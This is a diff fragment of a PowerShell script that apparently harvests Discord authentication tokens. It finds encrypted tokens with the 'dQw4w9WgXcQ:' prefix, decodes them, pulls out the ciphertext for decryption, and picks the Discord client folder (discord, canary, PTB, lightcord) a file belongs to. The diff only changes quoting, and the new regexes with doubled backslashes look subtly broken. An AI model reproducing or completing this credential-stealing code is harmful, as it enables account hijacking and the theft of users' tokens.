@@ -152,7 +152,7 @@ function Search-InFile {
     # Process encrypted tokens
     $encryptedMatches = [regex]::Matches($content, $encryptedRegex)
     foreach ($match in $encryptedMatches) {
-        $parts = $match.Value -split "dQw4w9WgXcQ:"
+        $parts = $match.Value -split 'dQw4w9WgXcQ:'
         if ($parts.Length -lt 2) { continue }
         $b64data = $parts[1]
         try {
@@ -169,12 +169,12 @@ function Search-InFile {
         $ciphertext = $decoded[15..($decoded.Length - 17)]  # bytes between IV and tag
 
         # Determine the application folder from the file path (Discord-based apps)
-        if ($FilePath -match "\\(discord|discordcanary|discordptb|lightcord)\\") {
-            if ($FilePath -match "\\discordcanary\\") {
+        if ($FilePath -match '\\\\(discord|discordcanary|discordptb|lightcord)\\\\') {
+            if ($FilePath -match '\\\\discordcanary\\\\') {
                 $appName = "discordcanary"
-            } elseif ($FilePath -match "\\discordptb\\") {
+            } elseif ($FilePath -match '\\\\discordptb\\\\') {
                 $appName = "discordptb"
-            } elseif ($FilePath -match "\\lightcord\\") {
+            } elseif ($FilePath -match '\\\\lightcord\\\\') {
                 $appName = "lightcord"
             } else {
                 $appName = "discord"
